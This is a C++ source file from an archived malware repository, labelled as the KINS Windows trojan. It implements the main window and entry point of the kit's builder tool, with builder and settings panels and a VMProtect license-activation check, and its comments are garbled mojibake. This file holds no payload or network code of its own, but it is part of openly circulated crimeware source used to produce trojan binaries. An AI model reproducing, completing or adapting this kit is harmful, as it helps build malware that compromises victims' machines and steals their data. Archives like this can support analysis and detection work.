/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <commctrl.h>
#include <ole2.h>
#include <shlwapi.h>

#include "defines.h"
#include "resources\resources.h"
#include "main.h"
#include "languages.h"
#include "tools.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\crypt.h"
#include "..\common\fs.h"
#include "..\common\gui.h"
#include "..\common\comlibrary.h"
#include "..\common\config.h"

#if BO_DEBUG <= 0
#include "activation.h"
#endif
//���������� ����������.
HMODULE currentModule;       //����� �������� ������.
WCHAR homePath[MAX_PATH];    //�������� ����������.
WCHAR settingsFile[MAX_PATH]; //���� �����.

static HRESULT comResult;     //�������� �� ComLibrary::_initThread().

//������ � ��������.
INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK toolSettingsProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

typedef struct
{
	HWND hwnd;
	DWORD lngId;
	DWORD resId;
	DLGPROC dlgProc;
}TOOLDATA;

static TOOLDATA toolsList[] =
{
	{NULL, Languages::tool_title_builder,  DIALOG_TOOL_BUILDER,  toolBuilderProc},
	{NULL, Languages::tool_title_settings, DIALOG_TOOL_SETTINGS, toolSettingsProc},
};
static BYTE lastTool         = 0xFF;
#define toolsCount (sizeof(toolsList) / sizeof(TOOLDATA))

/*
	�������� �������.

	IN hwnd  - ��������.
	IN index - ������ �������.
*/
static void loadTool(HWND hwnd, BYTE index)
{
	if(index != lastTool)
	{
		TOOLDATA *ct = &toolsList[index];
		CWA(user32, SetDlgItemTextW)(hwnd, IDC_TITLE, Languages::get(ct->lngId));
		if(lastTool != 0xFF)
			CWA(user32, ShowWindow)(toolsList[lastTool].hwnd, SW_HIDE);
		if(ct->hwnd == NULL)
			ct->hwnd = CWA(user32, CreateDialogParamW)(currentModule, MAKEINTRESOURCEW(ct->resId), hwnd, ct->dlgProc, NULL);
		lastTool = index;
		CWA(user32, ShowWindow)(ct->hwnd, SW_SHOW);
	}
}

/*
  ������� �������� ����.
*/
static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch(msg)
	{
		case WM_INITDIALOG:
			{
				//��������� ������ �������.
				{
					HWND hLB = CWA(user32, GetDlgItem)(hwnd, IDC_TOOLSLIST);
					for(BYTE i = 0; i < toolsCount; i++)
						CWA(user32, SendMessageW)(hLB, LB_ADDSTRING, 0, (LPARAM)Languages::get(toolsList[i].lngId));
					CWA(user32, SendMessageW)(hLB, LB_SETCURSEL, 0, 0);

				}

				//��������� ������.
				{
					HICON hIcon = Gui::_loadSharedIcon(currentModule, MAKEINTRESOURCEW(ICON_MAIN));
					CWA(user32, SendMessageW)(hwnd, WM_SETICON, ICON_SMALL, (WPARAM)hIcon);
					CWA(user32, SendMessageW)(hwnd, WM_SETICON, ICON_BIG, (WPARAM)hIcon);
				}

				//��������� ������� �� ���������.
				loadTool(hwnd, 0);

				//���������� ���������.
				CWA(user32, SetWindowTextW)(hwnd, Languages::get(Languages::main_title));
				break;
			}

		case WM_DESTROY:
			{
				for(BYTE i = 0; i < toolsCount; i++)
					if(toolsList[i].hwnd != NULL)
						CWA(user32, DestroyWindow)(toolsList[i].hwnd);
				break;
			}

		case WM_CLOSE:
			{
				//��������� ���� �������� ������������� � ��������.
				for(BYTE i = 0; i < toolsCount; i++)if(toolsList[i].hwnd)
				{
					if((bool)CWA(user32, SendMessageW)(toolsList[i].hwnd, WM_CANCLOSE, 0, 0) == false)
						return TRUE;
				}
				CWA(user32, EndDialog)(hwnd, 0);
				break;
			}

		case WM_COMMAND: 
			{
				switch(LOWORD(wParam))  
				{
					case IDC_TOOLSLIST:
						if(HIWORD(wParam) == LBN_SELCHANGE)
							loadTool(hwnd, (UINT)CWA(user32, SendMessageW)((HWND)lParam, LB_GETCURSEL, 0, 0));
						break;

					default:
						return FALSE;
				}
				break;
			}

		default:
			return FALSE;
	}

	return TRUE;
}

/*
  ����� �����.
*/
void WINAPI entryPoint(void)
{
	//������������� ������ ��� GUI.
	if(!Gui::_loadCommonControl(ICC_STANDARD_CLASSES) || !ComLibrary::_initThread(&comResult))
	{
		CWA(kernel32, ExitProcess)(1);
		return;
	}

	//������������� �������.
	currentModule = CWA(kernel32, GetModuleHandleW)(NULL);

	Mem::init();
	Crypt::init();

	//�������� ������� ����������.
	CWA(kernel32, GetModuleFileNameW)(NULL, homePath, MAX_PATH);
	CWA(shlwapi, PathRemoveFileSpecW)(homePath);
#if BO_DEBUG > 0
	//�������� ���� ��������.
	if(CWA(shlwapi, PathCombineW)(settingsFile, homePath, L"settings.ini") == FALSE)
		settingsFile[0] = 0;
#else
	//�������� ���� ��������.
	if(CWA(shlwapi, PathCombineW)(settingsFile, homePath, VMProtectDecryptStringW(L"settings.ini")) == FALSE)
		settingsFile[0] = 0;

	WCHAR activationKey[50];
	char* serial = (char*)Mem::alloc(5000);
	LPSTR activationKeyA;
	if(GetPrivateProfileStringW(VMProtectDecryptStringW(L"settings"), VMProtectDecryptStringW(L"activation"), L"", activationKey, 50, settingsFile) == NULL) goto Cleanup;
	activationKeyA = Str::_unicodeToAnsiEx(activationKey, -1);
	DWORD result = 0;

	if((result = VMProtectActivateLicense(activationKeyA, serial, 5000)) != 0)
	{
		LPWSTR errorCode;
		Str::_sprintfExW(&errorCode, VMProtectDecryptStringW(L"Error number: %u"), result);
		MessageBoxW(0, errorCode, VMProtectDecryptStringW(L"Error"), 0);
		goto Cleanup;
	}
	if(VMProtectSetSerialNumber(serial) != 0)
	{
		MessageBoxW(0, VMProtectDecryptStringW(L"Failed to start."), VMProtectDecryptStringW(L"Fail"), 0);
		goto Cleanup;
	}
#endif
	Languages::init();

	//��������� ������� ������.
	CWA(user32, DialogBoxParamW)(currentModule, MAKEINTRESOURCEW(DIALOG_MAIN), NULL, mainDialogProc, NULL);
	Cleanup:
	//��������������� �������.
	Languages::uninit();
	Crypt::uninit();
	Mem::uninit();  

	//��������������� ������ ��� GUI.
	ComLibrary::_uninitThread(comResult);
	CWA(kernel32, ExitProcess)(0);
}